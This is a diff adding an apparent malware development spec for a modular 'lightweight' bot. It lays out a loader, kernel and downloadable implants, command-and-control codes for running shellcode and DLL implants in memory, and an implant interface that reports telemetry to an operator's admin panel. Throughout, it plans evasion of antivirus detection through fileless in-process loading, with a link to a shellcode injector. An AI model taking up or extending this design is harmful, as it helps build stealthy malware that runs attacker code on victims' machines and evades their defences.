@@ -1,0 +1,117 @@
+PURPOSE
+
+The new bot is a development of the idea of lightweight.
+The previous version implemented a minimal set of functions - different options for starting a load, downloading a file, etc.
+In the new version, even these functions will be taken out of the kernel and will be loaded on demand in the form of implants.
+In this way we will try to minimize the contact surface with the AB.
+
+Bot and its protocol is over/subset of previous versions, i.e. it docks with existing and backend code base seamlessly.
+Some of the protocol commands are not used, some of the commands are new.
+
+ARCHITECTURE
+
+The bot consists of a loader, kernel and implants.
+The loader is optional, maybe you can load the core directly due to its minimalism.
+
+Core functions:
+- requesting an implant (command)
+- command result sending
+- sending telemetry
+
+The function of the implant is everything else.
+
+The format of the implant is either binary position-independent code or .dll (most likely .dll; will become clear during development).
+
+The kernel spins the command request loop, loads the implant, loads the parameters and load to it, runs it, sends the results.
+
+There is a contradiction between the bot's robustness to failure and the detectability of the AB:
+- for stability, it is better to run the implant in a separate process;
+- for non-detectability, it is better to run the implant in its own process.
+
+The contradiction is resolved by adding the startup context flag.
+
+Running in your own process is done with a fileless PE loader .dll - the source code is available online.
+The second option is https://github.com/DimopoulosElias/SimpleShellcodeInjector/blob/master/SimpleShellcodeInjector.c
+To achieve fault tolerance the bot kernel should be wrapped in SEH/VEH exception handlers.
+Running threads should also have exception handling to safely terminate and unclip the .dll after an exception.
+
+The final architecture will be determined by the results of the work.
+
+PROTOCOL
+
+The general framework of the protocol (request-response cycle, error handling, response format, etc) is the same as the version 1 protocol.
+Unless otherwise specified, the load is sent as a HTTP GET response body.
+
+Command format:
+%code% %timeout% [%args%]
+where
+   code - command code
+   timeout - timeout (0 - running the command in the background and ready for the next command request)
+   args - arguments are different for different types of commands
+
+0 %timeout% - no operation. Time - the number of seconds for which the bot should fall asleep before the next bounce to the server.
+117 %timeout% %payload% - start implant as shell code. There are no other parameters. Shell code is executed in the context of the current process.
+                                                         Note that the only difference from command 17 is the timeout. Maybe we can merge these two commands into one.
+                                                         The load in binary is position-independent binary code, executed by the bot as is, without any conversions.
+111 %timeout% ?caching? %payload% [%URI% [%args]] - run the implant as a .dll.
+                                                         caching == 0 is allowed to cache this implant. FIXME how will bot know what kind of implant it is?
+                                                                 == 1 the implant should be unloaded immediately after it completes
+                                                         The URI is a reference to the main load of the implant.
+                                                         If the main load for a given implant is not used, and it is not the last argument of the command,
+                                                         then a - (minus) sign will be given as the value.
+                                                         A more detailed treatment of the arguments is described in the corresponding section.
+?114 %timeout% - reset the cache of implants. All cached implants should be unloaded.
+
+Sending responses and telemetry are the same as the version 1 protocol.
+
+
+CORE-IMPLANT INTERFACE
+
+The main nuance is in transferring parameters to the implant and receiving a response from the implant.
+To do this, both the core and the implant provide an interface to each other.
+
+Dll must export at least one function with the following interface:
+
+DWORD WINAPI EntryPoint(
+    TELEMETRY_PROC lpTelemetryProc,
+    LPVOID payload,
+    SIZE_T paylen,
+    LPVOID args,
+    SIZE_T arglen
+)
+
+TELEMETRY_PROC is defined as follows:
+
+VOID WINAPI send_telemetry(CONST LPVOID message, SIZE_T len)
+and is the callback to send telemetry to the admin panel.
+
+If both arguments of the send_telemetry function are zeros, this is a signal from the implant to the parent to unload it.
+
+payload, paylen - load for the implant. The payload is downloaded by the bot from %URI% (command 111) and decrypted with the private key before being transferred to the implant.
+
+FIXME the question here is what's better - to simplify the bot and let the implant handle its own load, or to prepare it for it, since everything is there for it.
+
+args, arglen - pointer to the buffer and its length with custom implant arguments.
+The implant parses and interprets the arguments independently.
+The kernel modifies the buffer before passing it to the implant:
+- replaces the substring %id% with the bot identifier
+- Other macros are possible.
+To do this, the kernel has to take care of the safety of this substitution (buffer reallocations, if necessary)
+
+ADMINC
+
+Commands like "run .exe", "run script" will now be implemented through implants.
+Therefore, the builder commands must be configured - previously it was hardcoded, now the menu items and additional fields to them will be taken from the config/configurator.
+That's why we need a command configurator, either as a form, or at least as a config.
+
+The command is described by the following fields:
+- command name
+- implant file
+- presence of the implant main load
+- implant main load type: binary/text
+- optional parameter 1 (field type)
+- additional parameter 2 (field type)
+- ...
+
+The main load of the implant is the 10-13 runtime commands file.
+Additional parameters are (mostly) the command line for commands 10-13.
